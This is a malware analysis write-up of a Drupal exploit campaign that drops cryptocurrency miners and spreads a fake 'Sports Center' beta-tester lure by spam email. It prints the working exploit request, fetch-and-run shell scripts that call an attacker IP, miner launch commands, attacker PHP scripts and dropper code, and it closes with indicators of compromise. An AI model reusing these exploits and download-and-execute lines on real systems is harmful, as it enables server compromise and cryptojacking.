# Drupal Exploit Analysis 

### UPDATE 25/06/2018  
  
This is probably the last update. All my effort was worthless and the malware is still up and running.  
I'm still receiving exploit samples from multiples servers, but since the last update the malware itself is almost the same. I became a little impatient, so a did a little scraping :$ and found some very interesting stuff. I found an "all.tgz" file. GENIOUS!   

  
.  
├── all.tgz  
├── aws  
│   ├── awsmax.exe  
│   ├── awsmax.exe.config  
│   ├── ...  
│   ├── AWSSDK.EC2.xml  
│   ├── config  
│   │   ├── id-ap-northeast-1.txt  
│   │   ├── ...  
│   │   └── placeholder.txt  
│   └── **key.txt**  
├── **dobackup.sh**  
├── **home**  
│   └── **temo**  
│       ├── ipscans  
│       │   ├── data.txt  
│       │   └── scrapemini.py  
│       ├── ma.py  
│       ├── proc.sh  
│       ├── **.bash_history**  
│       └── ...  
│  
├── last  
├── reset.sh  
├── stat.sh  
└── var  
    └── www
         └── html
               ├── 7
               │   ├── ...
               │   └── xmr.tgz
               ├── a.sh
               ├── all.tgz
               ...

We can thank the backup script "dobackup.sh" for the info. Now I have also his backup in case he loses it again ^^  

>rm -rf /var/www/html/all.tgz  
>tar -czvf all.tgz * /var/www/html /home/temo  

I'm going to ignore the AWS key, It's not my bussiness to play with that, and I hope that nice people are reading this and won't mess with the guy. I've already reported the IP multiple times, so It's up to amazon to shut it down.  

Let's start. It works as always, It sends the drupal exploit that downloads the "a.sh" file and executes it.  

>xxxx.xxx/?q=user/password&name[#post_render][]=passthru&name[#markup]=wget%20-O%20/tmp/a.sh%20hxxp://155.94.75.92/a.sh;%20sh%20/tmp/a.sh&name[#type]=markup  

This file just downloads a pack of tools ("pack.tgz") and runs the "i" file.  

>ipath=\`find / -xdev -writable -executable -type d -print | shuf -n 1\`  
>chmod +x $ipath  
>wget -O $ipath/pack.tgz hxxp://155.94.75.92/pack.tgz  
>cd $ipath  
>tar -xzvf pack.tgz  
>chmod +x i  
>killall -9 i  
>kill -9 \`pidof i\`  
>./i  

This is the content of the "pack.tgz".  

>-rw-rw-r-- uzer/uzer      2837 2018-06-09 05:20 config.json  
>-rw-rw-r-- uzer/uzer    220612 2018-06-11 03:28 datacenters.csv  
>-rw-rw-r-- uzer/uzer       209 2018-06-20 05:48 eml.sh  
>-rw-rw-r-- uzer/uzer       663 2018-06-19 07:22 eml.txt  
>-rwxrwxr-x uzer/uzer    917880 2018-06-19 07:37 i  
>-rwxrwxr-x uzer/uzer   6363592 2018-05-26 18:44 jce_cn_cpu_miner32  
>-rwxrwxr-x uzer/uzer   5527452 2018-05-26 17:12 jce_cn_cpu_miner64  
>-rw-rw-r-- uzer/uzer       428 2018-05-27 23:38 ktc.sh  
>-rw-rw-r-- uzer/uzer   1218718 2018-05-21 08:33 libxmr-stak-backend.a  
>-rw-rw-r-- uzer/uzer     74766 2018-05-21 08:32 libxmr-stak-c.a  
>-rwxrwxr-x uzer/uzer   2823576 2018-06-04 01:38 luk-cpu  
>-rwxr-xr-x uzer/uzer   1844640 2018-04-29 22:57 php  
>-rwxr-xr-x uzer/uzer   1844640 2018-04-29 22:57 php5  
>-rw-rw-r-- uzer/uzer      1841 2018-06-09 08:24 pools.txt  
>-rw-rw-r-- uzer/uzer        46 2018-05-28 01:31 pre.sh  
>-rw-r--r-- uzer/uzer      3608 2018-06-11 10:11 scrape2.py  
>-rwxrwxr-x uzer/uzer       614 2018-06-09 05:20 startjce.sh  
>-rwxr-xr-x uzer/uzer    209344 2018-05-24 22:17 xmrigDaemon  
>-rwxr-xr-x uzer/uzer   5061888 2018-05-24 22:17 xmrigMiner  
>-rwxrwxr-x uzer/uzer   2019880 2018-05-21 08:33 xmr-stak  

  
uzer...mmm... Sorry Temo. Let's keep looking. What does the "i" file? It's a binary file that runs the following commands:  

>wget -O /dev/null 155.94.75.92/zz.php?a=start  
>sh ./pre.sh  
>sh ./ktc.sh  
>sh ./eml.sh&  
>python ./scrape2.py&  
>./php5 -o 151.80.248.204:443 -u nphp5 -p x --max-cpu-usage=100 --donate-level=1  
>./xmrigDaemon  
>sh ./startjce.sh  
>./xmr-stak -o 151.80.248.204:443 -u nxmrstak -p x --currency monero7  
>./luk-cpu -a xmr-v7 --host 151.80.248.204 --port 443 --user nluk --pass x --no-fail-on-malloc  
>wget -O /dev/null 155.94.75.92/zz.php?a=finish  

Now we can understand what the php files do. The first request is to the "zz.php" resource with the parameter "a" set to start. This is the content of the resource:  

>\<?php  
>echo ".";  

   T.T' Wow! I suppose it's just to see the apache logs and keep track of the compromised machines.
   Next things it does is run some scripts (We already saw that before, so I won't bore you...).   

The scrape2.py was the one that did the propagation. Let's understand the requests that do to its own server in the middle. If we remember right, the first thing it did was a request to the resource "y.php" to grab the target of the exploit. This php has the following content:  

>\<?php  
>  
>//$fn = "domains/runme" . rand(1,1551);  
>$fn = "domains2/runme" . rand(1,1431);  
>  
>$f_contents = file($fn);  
>  
>for( $i = 0; $i\<300; $i++ ) {  
>	$line = $f_contents[array_rand($f_contents)];  
>	echo $line;  
>}  

It shows a block of 300 domains of a random runme file in the domains2 folder. Inside that folder there was 1431 files with domains that, I supose, are vulnerables to the drupal exploit.  

After it grabs the target list, it does a request to "e.php" with the target of the exploit as an "url" parameter. This is the content of the resource:  

>\<?php  
>$txt = $_GET['url'];  
> $myfile = file_put_contents('logs.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);  
>echo "...";  

It just grabs the parameter and appends it to the "logs.txt" file. Here we find 63 different domains that are compromised by this guy. I need some help to report them all >.\<  

So far, the purpose of the malware was just run some miners. But now things get interesting... Let's go back to the eml.sh file.  

>for x in \`seq 1 100\`; do  
>wget -O list.txt hxxp://155.94.75.92/em.php  
>for i in \`cat list.txt\`; do  
>cat eml.txt | mail -s "Get paid 20 dollars to beta test our software" $i  
>done  
>rm -rf list.txt  
>done  

It sends 200k mails with the subject "Get paid 20 dollars to beta test our software" and the following body:  

>We are currently looking for 100 beta testers for our Sports Center Software.  Each accepted tester will earn $20 Paypal for helping us find problems/issues with our current program. To qualify for our payment you must download and run the program. Each user will receive a unique beta key. Once your beta key is entered into the downloaded program the $20 payment will be sent to the paypal email you provide.  
>  
>What Does Our Program Do?  
>Real Time Sports News  
>Watch Sports Games Worldwide  
>Live Scores and Game Notifications  
>Chat with Other Sports Fans During the Games  
>  
>If you are interested head on over to hxxp://thesportscenter.club  
>  
>We hope to see you there.  

Interesting. And it uses the same mechanism as the "y.php" one, but now with domains and in 2000 blocks.  

>\<?php  
>  
>//$fn = "domains/runme" . rand(1,1551);  
>$fn = "eml/runme" . rand(1,1513);  
>  
>$f_contents = file($fn);  
>//echo "fdgsdfgdsf@larjem.com\n";  
>for( $i = 0; $i\<2000; $i++ ) {  
>	$line = $f_contents[array_rand($f_contents)];  
>	echo $line;  
>}  

This webpage encourages you to download a zip file with two executables. It asks for your paypal account and name.  

>We are currently looking for 100 beta testers for our Sports Center Program. Each accepted tester will earn $20 Paypal...  

  
It doesn't show you the zip file, but looking at the source code of the webpage we see where it's allocated.   

There a js with the following content:  

>...  
>...\<a href="SportsCenter.zip" id="submit2" onClick="warning();...  
>...  

Also, wee see the final tip:  

 >\<h1>Warning\</h1>
    >\<p>Some browsers may say something along the lines of "SportsCenter.zip is not commonly downloaded and may be dangerous".\<br>We assure you that it is not dangerous,  The reason your browser displays it is because not a lot of people have downloaded this file so some browsers automaticly classify it as risky\</p>
    >\<br>To allow the download in chrome click the arrow and then click keep\<br>

hahahaha, do we trust this guy? Of course. Let's download it. Inside the zip, there are two files, "data.bin" and "SportsCenterInstall.bat".  

The bat file just runs the "data.bin":  

>@echo off  
>move data.bin sportscenter.exe  
>sportscenter.exe  
>move sportscenter.exe data.bin  

And what does the exe do? The "sportscenter.exe" is just an installer for another file, a miner. It sets the URL of the resource:  

>private static string url = "hxxp://thesportscenter.club/";  

Even has a cool output, with sleeps. That way it seems that is really doing something ^^  

>SportsInstall.dooutput("[                    ]");  
>SportsInstall.setfolder();  
>SportsInstall.dooutput("[+++++               ]");  
>SportsInstall.doreg();  
>SportsInstall.dooutput("[++++++++++          ]\r\nCopying program files,  this might take a few minutes");  
>SportsInstall.doinstall();  
>SportsInstall.dooutput("[++++++++++++++      ]");  
>SportsInstall.startservice();  
>SportsInstall.dooutput("[++++++++++++++++    ]\r\nSetting up display params");  
>Thread.Sleep(2200);  
>SportsInstall.dooutput("[+++++++++++++++++   ]\r\nConfiguring default channels based on your location,  You can add more later");  
>Thread.Sleep(4500);  
>SportsInstall.dooutput("[++++++++++++++++++++]\r\nEnrolling in beta program");  
>Console.WriteLine("Please enter your beta key below");  
>Console.WriteLine("If you do not enter your beta key you will not be paid for your participation in the beta program");  
>Console.WriteLine("Type your beta key now: ");  
>Console.ReadLine();  
>Console.WriteLine("Setup complete Press any key to exit. you can find the program in your Program Files directory");  
>Console.ReadLine();  

It asks for a key, but never useses it. That way it seems believable. Then, what does it do? Here's the reall install function:  

>private static void doinstall()  
>		{  
>			bool flag = MyProject.Computer.FileSystem.FileExists(SportsInstall.serviceto + "\\SportsService.exe");  
>			if (!flag)  
>			{  
>				WebClient webClient = new WebClient();  
>				byte[] data = webClient.DownloadData(SportsInstall.url + "SportsService.exe");  
>				MyProject.Computer.FileSystem.WriteAllBytes(SportsInstall.serviceto + "\\SportsService.exe", data, false);  
>			}  
>			ManagedInstallerClass managedInstallerClass = new ManagedInstallerClass();  
>			string[] args = new string[]  
>			{  
>				SportsInstall.serviceto + "\\SportsService.exe"  
>...  

It downloads the SportsService.exe file and runs it. Well, we are getting close to the final.   

It sets a url and a work directory:  

>public SportsService()  
>		{  
>			this.workdir = "";  
>			this.url = "hxxp://155.94.75.92/";  
>			this.debugon = true;  
>			this.isrunning = true;  
>			this.InitializeComponent();  
>		}  

Downloads all the tools needed, with a long sleep to counter sandboxes and runs a miner T.T'  

  
>while (Conversions.ToBoolean(this.isrunning))  
>	{  
>		Thread.Sleep(60000);  
>		this.download("libeay32.dll");  
>		this.download("pools.txt");  
>		this.download("ssleay32.dll");  
>		this.download("xmr-stak.exe");  
>		this.download("xmrstak_cuda_backend.dll");  
>		this.download("xmrstak_opencl_backend.dll");  
>		**this.proc = Process.Start(new ProcessStartInfo("xmr-stak.exe", "-o 151.80.248.204:443 -u sports -p x --currency monero7 -i 0")**  

It also gains persistency setting up a service in the machine.  

So, everything comes to an end. All these just to run a miner. :(  

**THE END**


IOCs:

 - IPs
   + 155.94.75.92
   + 151.80.248.204
 - MD5
   + ec79ba3ab498b5d5cb564f7053ab5832  data.bin
   + 21b2d02bad53ad12a30ca54145c75024  SportsCenterInstall.bat
   + a27a34ac26481631bdcd31d80dddc8a9  SportsCenter.zip
   + 24f283be88a3569dc8e4bb2487793029  pack.tgz
   + b370b2abc7e7faadefed8162a46a5a5f  i
   + 74d5938fa520004f485923bcacf0d6b3  xmrigDaemon
   + cdc1e47d08bc49da19a8fd17a9e7bb67  xmrigMiner
   + 23dafaf71f7b95d038914e57a25e22c9  xmr-stak
   + 52f27b36bec22581c400140d626879a8  xmrstak_cuda_backend.dll
   + 68870daf07a621747b8ca8ac602642b0  xmr-stak.exe
   + 1725dbde55f983454b7cd70d995efffc  xmrstak_opencl_backend.dll
   + 820bc0599d45ec448d3a567b5bcff3df  xmr.tgz
   + 950cbfd094cab045156f33c4b69f0544  SportsService.exe

